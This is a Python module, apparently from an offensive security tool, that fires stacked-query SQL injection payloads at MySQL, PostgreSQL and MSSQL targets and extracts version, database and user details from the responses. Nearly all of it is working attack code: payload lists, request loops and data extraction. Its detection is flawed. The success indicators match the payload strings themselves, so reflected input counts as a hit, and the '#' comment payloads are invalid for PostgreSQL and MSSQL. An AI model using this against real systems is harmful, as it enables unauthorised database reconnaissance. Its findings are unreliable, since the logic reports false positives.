import logging
from typing import List, Dict, Any, Optional
from core.request_engine import RequestEngine
from core.payload_manager import PayloadManager

class StackedQueriesInjector:
    def __init__(self, request_engine: RequestEngine, payload_manager: PayloadManager):
        self.request_engine = request_engine
        self.payload_manager = payload_manager
        
    def test_all_parameters(self) -> List[Dict[str, Any]]:
        """Test all parameters for stacked queries SQL injection vulnerabilities."""
        results = []
        
        # Test MySQL stacked queries
        mysql_results = self._test_mysql_stacked()
        if mysql_results:
            results.extend(mysql_results)
            
        # Test PostgreSQL stacked queries
        postgres_results = self._test_postgres_stacked()
        if postgres_results:
            results.extend(postgres_results)
            
        # Test MSSQL stacked queries
        mssql_results = self._test_mssql_stacked()
        if mssql_results:
            results.extend(mssql_results)
            
        return results
        
    def _test_mysql_stacked(self) -> List[Dict[str, Any]]:
        """Test for MySQL stacked queries SQL injection."""
        results = []
        
        # Common MySQL stacked queries payloads
        payloads = [
            "'; SELECT 1 --",
            "'; SELECT 1 #",
            "'; SELECT version() --",
            "'; SELECT version() #",
            "'; SELECT database() --",
            "'; SELECT database() #",
            "'; SELECT user() --",
            "'; SELECT user() #",
            "'; SELECT @@version --",
            "'; SELECT @@version #",
            "'; SELECT @@hostname --",
            "'; SELECT @@hostname #",
            "'; SELECT @@datadir --",
            "'; SELECT @@datadir #",
            "'; SELECT @@basedir --",
            "'; SELECT @@basedir #"
        ]
        
        for payload in payloads:
            try:
                # Send request with payload
                response, _ = self.request_engine.send_request(payload=payload)
                
                # Check if response indicates successful injection
                if self._check_mysql_stacked_success(response):
                    results.append({
                        "type": "mysql_stacked_queries",
                        "payload": payload,
                        "status": "vulnerable",
                        "data": self._extract_mysql_stacked_data(response)
                    })
                    
            except Exception as e:
                logging.error(f"Error testing MySQL stacked queries: {str(e)}")
                continue
                
        return results
        
    def _test_postgres_stacked(self) -> List[Dict[str, Any]]:
        """Test for PostgreSQL stacked queries SQL injection."""
        results = []
        
        # Common PostgreSQL stacked queries payloads
        payloads = [
            "'; SELECT 1 --",
            "'; SELECT 1 #",
            "'; SELECT version() --",
            "'; SELECT version() #",
            "'; SELECT current_database() --",
            "'; SELECT current_database() #",
            "'; SELECT current_user --",
            "'; SELECT current_user #",
            "'; SELECT session_user --",
            "'; SELECT session_user #",
            "'; SELECT inet_server_addr() --",
            "'; SELECT inet_server_addr() #",
            "'; SELECT inet_server_port() --",
            "'; SELECT inet_server_port() #"
        ]
        
        for payload in payloads:
            try:
                # Send request with payload
                response, _ = self.request_engine.send_request(payload=payload)
                
                # Check if response indicates successful injection
                if self._check_postgres_stacked_success(response):
                    results.append({
                        "type": "postgres_stacked_queries",
                        "payload": payload,
                        "status": "vulnerable",
                        "data": self._extract_postgres_stacked_data(response)
                    })
                    
            except Exception as e:
                logging.error(f"Error testing PostgreSQL stacked queries: {str(e)}")
                continue
                
        return results
        
    def _test_mssql_stacked(self) -> List[Dict[str, Any]]:
        """Test for MSSQL stacked queries SQL injection."""
        results = []
        
        # Common MSSQL stacked queries payloads
        payloads = [
            "'; SELECT 1 --",
            "'; SELECT 1 #",
            "'; SELECT @@version --",
            "'; SELECT @@version #",
            "'; SELECT db_name() --",
            "'; SELECT db_name() #",
            "'; SELECT system_user --",
            "'; SELECT system_user #",
            "'; SELECT @@servername --",
            "'; SELECT @@servername #",
            "'; SELECT @@language --",
            "'; SELECT @@language #",
            "'; SELECT @@spid --",
            "'; SELECT @@spid #"
        ]
        
        for payload in payloads:
            try:
                # Send request with payload
                response, _ = self.request_engine.send_request(payload=payload)
                
                # Check if response indicates successful injection
                if self._check_mssql_stacked_success(response):
                    results.append({
                        "type": "mssql_stacked_queries",
                        "payload": payload,
                        "status": "vulnerable",
                        "data": self._extract_mssql_stacked_data(response)
                    })
                    
            except Exception as e:
                logging.error(f"Error testing MSSQL stacked queries: {str(e)}")
                continue
                
        return results
        
    def _check_mysql_stacked_success(self, response) -> bool:
        """Check if MySQL stacked queries injection was successful."""
        success_indicators = [
            "mysql",
            "mariadb",
            "version()",
            "database()",
            "user()",
            "@@version",
            "@@hostname",
            "@@datadir",
            "@@basedir"
        ]
        
        return self._check_stacked_success(response, success_indicators)
        
    def _check_postgres_stacked_success(self, response) -> bool:
        """Check if PostgreSQL stacked queries injection was successful."""
        success_indicators = [
            "postgresql",
            "postgres",
            "version()",
            "current_database()",
            "current_user",
            "session_user",
            "inet_server_addr()",
            "inet_server_port()"
        ]
        
        return self._check_stacked_success(response, success_indicators)
        
    def _check_mssql_stacked_success(self, response) -> bool:
        """Check if MSSQL stacked queries injection was successful."""
        success_indicators = [
            "microsoft sql server",
            "sql server",
            "@@version",
            "db_name()",
            "system_user",
            "@@servername",
            "@@language",
            "@@spid"
        ]
        
        return self._check_stacked_success(response, success_indicators)
        
    def _check_stacked_success(self, response, indicators: List[str]) -> bool:
        """Check if stacked queries injection was successful."""
        response_text = response.text.lower()
        return any(indicator.lower() in response_text for indicator in indicators)
        
    def _extract_mysql_stacked_data(self, response) -> Dict[str, str]:
        """Extract data from successful MySQL stacked queries injection."""
        data = {}
        response_text = response.text.lower()
        
        # Extract version
        if "version()" in response_text or "@@version" in response_text:
            start = response_text.find("version")
            if start != -1:
                version_line = response_text[start:].split('\n')[0]
                data["version"] = version_line.strip()
                
        # Extract database name
        if "database()" in response_text:
            start = response_text.find("database")
            if start != -1:
                db_line = response_text[start:].split('\n')[0]
                data["database"] = db_line.strip()
                
        # Extract user
        if "user()" in response_text:
            start = response_text.find("user")
            if start != -1:
                user_line = response_text[start:].split('\n')[0]
                data["user"] = user_line.strip()
                
        return data
        
    def _extract_postgres_stacked_data(self, response) -> Dict[str, str]:
        """Extract data from successful PostgreSQL stacked queries injection."""
        data = {}
        response_text = response.text.lower()
        
        # Extract version
        if "version()" in response_text:
            start = response_text.find("version")
            if start != -1:
                version_line = response_text[start:].split('\n')[0]
                data["version"] = version_line.strip()
                
        # Extract database name
        if "current_database()" in response_text:
            start = response_text.find("current_database")
            if start != -1:
                db_line = response_text[start:].split('\n')[0]
                data["database"] = db_line.strip()
                
        # Extract user
        if "current_user" in response_text or "session_user" in response_text:
            start = response_text.find("current_user") if "current_user" in response_text else response_text.find("session_user")
            if start != -1:
                user_line = response_text[start:].split('\n')[0]
                data["user"] = user_line.strip()
                
        return data
        
    def _extract_mssql_stacked_data(self, response) -> Dict[str, str]:
        """Extract data from successful MSSQL stacked queries injection."""
        data = {}
        response_text = response.text.lower()
        
        # Extract version
        if "@@version" in response_text:
            start = response_text.find("@@version")
            if start != -1:
                version_line = response_text[start:].split('\n')[0]
                data["version"] = version_line.strip()
                
        # Extract database name
        if "db_name()" in response_text:
            start = response_text.find("db_name")
            if start != -1:
                db_line = response_text[start:].split('\n')[0]
                data["database"] = db_line.strip()
                
        # Extract user
        if "system_user" in response_text:
            start = response_text.find("system_user")
            if start != -1:
                user_line = response_text[start:].split('\n')[0]
                data["user"] = user_line.strip()
                
        return data 
